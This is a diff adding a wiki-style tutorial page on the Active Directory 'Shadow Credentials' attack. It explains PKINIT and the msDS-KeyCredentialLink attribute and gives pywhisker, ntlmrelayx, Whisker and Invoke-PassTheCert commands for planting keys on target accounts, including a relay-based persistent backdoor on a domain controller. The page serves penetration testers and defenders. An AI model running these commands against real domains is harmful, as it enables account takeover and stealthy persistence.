@@ -1,0 +1,99 @@
+---
+authors: ShutdownRepo, WoBuGs, mpgn, p0dalirius, sckdev, jamarir
+category: ad
+---
+
+# Shadow Credentials
+
+## Theory
+
+The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](roasting/asreproast.md)). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.
+
+> The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. The KDC also has a public-private key pair, allowing for the exchange of a session key. 
+>  
+> ([specterops.io](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab))
+
+Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.
+
+There are multiple scenarios where an attacker can have control over an account that has the ability to edit the `msDS-KeyCredentialLink` (a.k.a. "kcl") attribute of other objects (e.g. member of a [special group](../builtins/security-groups), has [powerful ACEs](../dacl/), etc.). This allows attackers to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object (can be a user or a computer).
+
+## Practice
+
+In order to exploit that technique, the attacker needs to:
+
+1. be in a domain that supports PKINIT and containing at least one Domain Controller running Windows Server 2016 or above.
+2. be in a domain where the Domain Controller(s) has its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled or when a certificate authority (CA) is in place).
+3. have control over an account that can edit the target object's `msDs-KeyCredentialLink` attribute.
+
+> [!TIP]
+> The `msDS-KeyCredentialLink` feature was introduced with Windows Server 2016. However, this is not to be confused with PKINIT which was already present in Windows 2000. The `msDS-KeyCredentialLink` feature allows to link an X509 certificate to a domain object, that's all.
+
+If those per-requisites are met, an attacker can
+
+1. create an RSA key pair
+2. create an X509 certificate configured with the public key
+3. create a [KeyCredential](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/de61eb56-b75f-4743-b8af-e9be154b47af) structure featuring the raw public key and add it to the `msDs-KeyCredentialLink` attribute
+4. authenticate using PKINIT and the certificate and private key
+
+::: tabs
+
+=== UNIX-like
+
+From UNIX-like systems, the `msDs-KeyCredentialLink` attribute of a user or computer target can be manipulated with the [pyWhisker](https://github.com/ShutdownRepo/pywhisker) tool.
+
+```bash
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
+```
+
+> [!SUCCESS]
+> The `add` action from pywhisker is featured in ntlmrelayx.
+> 
+> ```bash
+> ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
+> ```
+
+When the public key has been set in the `msDs-KeyCredentialLink` of the target, the certificate generated can be used with [Pass-the-Certificate](pass-the/pass-the-certificate.md) to obtain a TGT and further access.
+
+
+=== Windows
+
+From Windows systems, the `msDs-KeyCredentialLink` attribute of a target user or computer can be manipulated with the [Whisker](https://github.com/eladshamir/Whisker) tool.
+
+```powershell
+Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+```
+
+It can also be done with the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) tool.
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash), and provides numerous actions (e.g. raw LDAP queries, Shadow Credentials enumeration & exploitation, DnsRecords enumeration, etc.)
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+# List the keys of a principal (not specifying -Object switch would list all targets with an msDs-KeyCredentialLink attribute)
+Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'ShadowCreds' -Object 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL'
+# Populates the targeted account's 'msDS-KeyCredentialLink' attribute with a new self-signed certificate.
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -Target 'CN=John JD. DOE,CN=Users,DC=ADLAB,DC=LOCAL'
+```
+
+When the public key has been set in the `msDs-KeyCredentialLink` of the target, the certificate generated can be used with [Pass-the-Certificate](pass-the/pass-the-certificate.md) to obtain a TGT and further access.
+
+:::
+
+
+> [!TIP] Self edit the KCL attribute
+> User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. This means the following scenario could work: [trigger an NTLM authentication](../mitm-and-coerced-authentications/) from DC01, [relay it](../ntlm/relay.md) to DC02, make pywhisker edit DC01's attribute to create a Kerberos PKINIT pre-authentication backdoor on it, and have persistent access to DC01 with PKINIT and [pass-the-cache](pass-the/ptc.md).
+> 
+> Computer objects can only edit their own `msDS-KeyCredentialLink` attribute if KeyCredential is not set already.
+
+## Resources
+
+[https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+
+[https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker)
+
+[https://github.com/ShutdownRepo/pywhisker](https://github.com/ShutdownRepo/pywhisker)
